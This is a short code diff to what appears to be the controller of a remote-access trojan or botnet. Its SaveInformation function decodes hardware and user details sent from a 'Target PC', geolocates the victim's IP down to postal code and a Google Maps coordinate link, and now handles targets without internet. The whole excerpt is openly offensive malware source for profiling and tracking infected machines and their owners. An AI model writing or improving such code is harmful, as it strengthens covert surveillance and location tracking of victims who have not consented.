@@ -214,15 +214,25 @@ def SaveInformation(client_socket, filename):
         vram = xor(Evram)
         agent_location = xor(Eagent_location)
         user_pc = xor(Euser_pc)
-        ip_info = database.city(wanip)
-        ISO_CODE = ip_info.country.iso_code
-        country = ip_info.country.name
-        pstlcode = ip_info.postal.code
-        reigon = ip_info.subdivisions.most_specific.name
-        city = ip_info.city.name
-       # location = str(ip_info.location.latitude) + " " + str(ip_info.location.longitude)
-        location = "https://www.google.com/maps?q="+str(ip_info.location.latitude)+","+str(ip_info.location.longitude)
         
+        if(wanip.startswith("No")):
+            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] No Internet was detected on Target PC.")
+            ip_info = "Failed to get"
+            ISO_CODE = "Failed to get"
+            country = "Failed to get"
+            pstlcode = "Failed to get"
+            reigon = "Failed to get"
+            city = "Failed to get"
+            location = "Failed to get"
+        else:
+            ip_info = database.city(wanip)
+            ISO_CODE = ip_info.country.iso_code
+            country = ip_info.country.name
+            pstlcode = ip_info.postal.code
+            reigon = ip_info.subdivisions.most_specific.name
+            city = ip_info.city.name
+        # location = str(ip_info.location.latitude) + " " + str(ip_info.location.longitude)
+            location = "https://www.google.com/maps?q="+str(ip_info.location.latitude)+","+str(ip_info.location.longitude)
 
         if(botsettings['auto_print_bot_info'] == True):
             print("Ram               : " + str(ram))
